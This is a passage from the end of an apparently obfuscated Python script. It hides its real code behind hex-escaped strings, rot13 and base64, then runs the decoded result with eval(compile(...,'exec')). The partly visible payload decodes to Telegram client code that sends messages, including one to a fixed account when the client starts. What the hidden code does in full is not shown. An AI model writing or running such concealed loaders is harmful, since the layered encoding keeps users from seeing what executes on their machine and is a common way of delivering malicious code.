PNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVTI4nKDbXD0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtMKuwMKO0VRI4L2IjqTyiovOuplOyBt0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVUOlnJ50XTHcQDbtVPNtVPNtVPNtVPNtVPNtVPNtVTS3LJy0VTAfnJIhqP5mMJ5xK21yp3AuM2HbMKMyoaDhL2uuqS9cMPkmMJ5xXD0XVPNtVN0XVPNtVTIfp2HtBt0XVPNtVPNtVPOwoTyyoaDhp2IhMS9gMKAmLJqyXPqurKEioTRaYPYLf9zR2XsMuFQMuAva24mLf9zT2YZt2YULdAva2Xbt2YeowAvk2LULhqva2LDt2YGLe9zUVAzR2YsMtqvaVAzO2YaLc9zR2YDt2daMughZ2X8vXD0XVPNtVPNtVPOwoTyyoaDhMTymL29hozIwqTIxXPxAPzAfnJIhqP5mqTSlqPtcQDcwoTyyoaDhpaIhK3IhqTyfK2Ecp2Aioz5yL3EyMPtcVPNtVPN='
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
